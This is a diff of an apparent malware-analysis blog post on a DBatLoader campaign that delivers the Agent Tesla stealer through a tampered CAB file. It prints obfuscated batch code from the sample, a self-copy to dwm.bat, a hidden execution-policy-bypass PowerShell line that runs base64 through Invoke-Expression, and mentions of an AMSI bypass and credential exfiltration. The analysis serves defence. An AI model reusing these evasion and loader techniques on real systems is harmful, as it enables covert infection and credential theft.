@@ -6,16 +6,27 @@ layout: post
 
 # DBatloader delivering Agent Tesla
 
-While reading up on malware news, I came across this post by asec: https://asec.ahnlab.com/en/85834/ that describes a campaign involving distribution of a malware using batch files packaged into a MS CAB file. This malware was known as DBATLoader and the CAB file header it was packaged in was modified to bypass security controls.
+While reviewing recent threat intelligence reports, I came across a post by AhnLab Security Emergency Response Center (ASEC): [DBatLoader Distributing AgentTesla via CAB File](https://asec.ahnlab.com/en/85834/). The article describes a malware campaign in which a batch script, embedded within a modified Microsoft Cabinet (CAB) file, is used to deploy a known loader malware—DBatLoader. The CAB file header is tampered with to bypass detection mechanisms.
 
-I'll be analysing one such sample on Virustotal: https://www.virustotal.com/gui/file/ee945aefb2643f4de44a80b9f1c6c7b8b8a854ee8dd83d952b910867c2c72c8d.  SHA256: ee945aefb2643f4de44a80b9f1c6c7b8b8a854ee8dd83d952b910867c2c72c8d 
+**SHA-256**: `ee945aefb2643f4de44a80b9f1c6c7b8b8a854ee8dd83d952b910867c2c72c8d`  
+[View on VirusTotal](https://www.virustotal.com/gui/file/ee945aefb2643f4de44a80b9f1c6c7b8b8a854ee8dd83d952b910867c2c72c8d)
 
-## Analysis of CMD file
-Using 7-zip to open the CAB file, a CMD file, a png file and a text file is packaged in. The text file contains nothing of interests and the png file appears to be an invoice which is used to provide legitimacy to the package. 
+
+## CAB File Contents
+
+Upon inspecting the CAB file with 7-Zip, the following files were extracted:
+* A `.cmd` script (heavily obfuscated)
+* A `.png` image, masquerading as an invoice to lend credibility
+* A `.txt` file, containing no meaningful content
 
 ![invoice](/assets/images/dbat_tesla/invoice.png)
 
-The CMD file appears to be the click bait for the victim, so I'll start the analysis from there. On first glance, its pretty clear the CMD file is heavily obfuscated.
+The CMD script is clearly the initial execution vector and contains multiple layers of obfuscation. Let’s walk through its behavior.
+
+
+## CMD Script Deconstruction
+
+At first glance, the script is composed of long sequences of seemingly random environment variable references and obfuscated commands:
 
 ```cmd
 %ogj%@%ogj%e%ogj%c%ogj%h%ogj%o%ogj% %ogj%o%ogj%f%ogj%f%ogj%
@@ -40,8 +51,9 @@ if not DEFINED tqlpfujzeixzvrqRzKvtqlpfujzeixzvrq set tqlpfujzeixzvrqRzKvtqlpfuj
 !cdncd! "%jla%l%jla%z%jla%b%jla%v=GRlY3J5cHRvcl92YXIuVH"
 ...
 ```
-
-There is also two large blob of what appears to be obfuscated data. One prefixed with "::*space*" and the other ":::".
+It also contains two large data blobs:
+* One prefixed with ::*space*
+* Another prefixed with ::: and encoded in a pseudo-base64 format
 
 ```cmd
 ...
@@ -56,7 +68,7 @@ There is also two large blob of what appears to be obfuscated data. One prefixed
 ...
 ```
 
-After deobfuscation, the cmd file looks something like this:
+Once the variable indirection is resolved, the logic becomes more apparent:
 ```cmd
 @echo off
 set tqlpfujzeixzvrqRzKvtqlpfujzeixzvrq=1 && start "" /min "%~dpnx0" %* && exit
@@ -78,17 +90,21 @@ set "mqka=lPVtTeXN0ZW0uU2VjdXJp"
 ...
 ```
 
-"sourceFile" is set to the full path of the CMD file. A copy instruction is used to copy the CMD file to the %userprofile% directory and renamed to "dwm.bat". Further down the deobfuscated script, commands are concantenated from environment variables set before.
+The script:
+1. Copies itself to `%USERPROFILE%\dwm.bat`
+2. Defines many environment variables with chunks of PowerShell code
+3. Reconstructs a command from those variables shown below
 
 ```cmd
 %diai%%psbo%%egrp%%muwb%%syfy%%zfmt%%hfsd%%occb%%nqxl%%agno%%rwue%%yvnd%%siaz%%bzlc%%ckap%%fixk%%ujhl%%xmph%%xjcs%%lmof%%adop%%pdqo%%xlhv%%yusd%%wtge%%jbsn%%gmef%%bgjh%%jwla%%jkje%%kohj%%ioyc%%nwxv%%ehnq%%buae%%rbxw%%hmxr%%nlji%%gusk%%txxs%%uzyo%%vpyk%%jrwy%%hels%%oayg%%lkux%%etat%%gbuj%%vnwb%%paey%%gbbw%%klyq%%yexb%%xywl%%twvw%%zsmo%%bxkb%%vhwi%%dfld%%pdue%%mkmf%%amjv%%oynk%%nbks%%upxm%%wkcr%%sbhl%%egtk%%ibnz%%wljr%%oltg%%zdhi%%jebb%%ipsm%%pyth%%vzei%%ygqn%%hhqt%%vbtf%%enaw%%extb%%jbzd%%qdnz%%ykcq%%sqrv%%kwsy%%zuco%%kmwy%%mqka%%lhho%%gvbf%%pacq%%duwe%%ghxu%%nuag%%rvty%%pijf%%nlkw%%ndki%%gbkc%%zdfm%%zopw%%iqjq%
 ```
 
-Further work on deobfuscating this reveals a powershell command. A base64 encoded string is decoded and invoked. 
-
+Which resolves to:
 ```ps1
 "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -noprofile -windowstyle hidden -ep bypass  -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHVzZXJOYW1lID0gJGVudjpVU0VSTkFNRTskeGd0dXIgPSAiQzpcVXNlcnNcJHVzZXJOYW1lXGR3bS5iYXQiO2lmIChUZXN0LVBhdGggJHhndHVyKSB7ICAgIFdyaXRlLUhvc3QgIkJhdGNoIGZpbGUgZm91bmQ6ICR4Z3R1ciIgLUZvcmVncm91bmRDb2xvciBDeWFuOyAgICAkZmlsZUxpbmVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbExpbmVzKCR4Z3R1ciwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOCk7ICAgIGZvcmVhY2ggKCRsaW5lIGluICRmaWxlTGluZXMpIHsgICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ146OjogPyguKykkJykgeyAgICAgICAgICAgIFdyaXRlLUhvc3QgIkluamVjdGl....) | Invoke-Expression"
 ```
+Eventually, the script executes a Base64-decoded PowerShell command.
+
 
 ## Analysis of Powershell command (1/2)
 
@@ -197,7 +213,7 @@ if ($DisableSvc) {
 The purpose of the data blob is to bypass AMSI protection.
 
 ## Analysis of Powershell command (2/2)
-Swifting the focus back to the powershell command, following the bypassing of AMSI, the first data blob identified earlier is parsed.
+Shifting the focus back to the powershell command, following the bypassing of AMSI, the first data blob identified earlier is parsed.
 
 ```ps1
 foreach ($jwy in $psgyt) {	
@@ -366,3 +382,13 @@ Screen logged exists in memory and is converted to array before exfiltration to 
 Idan Malihi has done research on a different sample. The sample exfiltrates data using SMTP instead of FTP.
 
 https://idanmalihi.com/dissecting-agent-tesla-unveiling-threat-vectors-and-defense-mechanisms/
+
+## Summary of Malicious Capabilities
+While the obfuscated payload doesn't immediately display Agent Tesla behavior, this final reflective load stage is a known tactic used to unpack Agent Tesla, a keylogger and information stealer, into memory.
+
+Agent Tesla commonly:
+* Captures keystrokes
+* Steals clipboard contents
+* Exfiltrates saved credentials from browsers, email clients, and VPN software
+* Uses SMTP, FTP, or HTTP POST to exfiltrate data
+
